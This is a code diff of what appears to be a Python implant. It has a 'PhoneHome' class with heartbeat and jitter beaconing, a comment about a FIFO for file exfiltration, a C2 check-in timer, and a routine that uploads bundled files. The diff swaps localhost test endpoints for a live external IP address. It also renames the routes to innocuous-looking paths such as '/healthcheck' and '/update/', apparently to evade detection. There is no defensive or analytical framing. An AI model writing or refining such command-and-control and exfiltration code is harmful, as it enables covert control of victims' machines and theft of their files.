@@ -27,8 +27,8 @@ PIPE = "/tmp/fifo"  # FIFO path for file exfiltration
 class PhoneHome:
     heartbeat = 30
     jitter = 15
-    home_url = "https://localhost:8888/kk"
-    # home_url = 'https://104.53.222.47:8888/kk'
+    # home_url = "https://localhost:8888/kk"
+    home_url = "https://104.53.222.47:443/healthcheck"
 
     def __init__(self):
         super().__init__()
@@ -37,7 +37,7 @@ class PhoneHome:
         payload = {"miner_id": MinerID}
         try:
             r = requests.post(
-                self.home_url + "/beacon",
+                self.home_url + "/check/",
                 json=payload,
                 verify=False,
             )
@@ -53,7 +53,7 @@ class PhoneHome:
 
     def CallCoin(self, CoinResult, MinerID):  # send a coin result to bank
         payload = {"miner_id": MinerID, "coin_result": CoinResult}
-        requests.post(self.home_url + "/coin", json=payload)
+        requests.post(self.home_url + "/pass/", json=payload)
 
     def NewTime(self):  # get the next C2 check-in time
         current_time = datetime.datetime.now()
@@ -131,7 +131,7 @@ def watch_and_bundle(mid):
                     "metadata": (None, json.dumps({"uuid": mid})),
                 }
                 requests.post(
-                    "https://localhost:8888/kk/upload",
+                    "https://104.53.222.47:8888/kk/update/",
                     files=files,
                     verify=False,
                 )
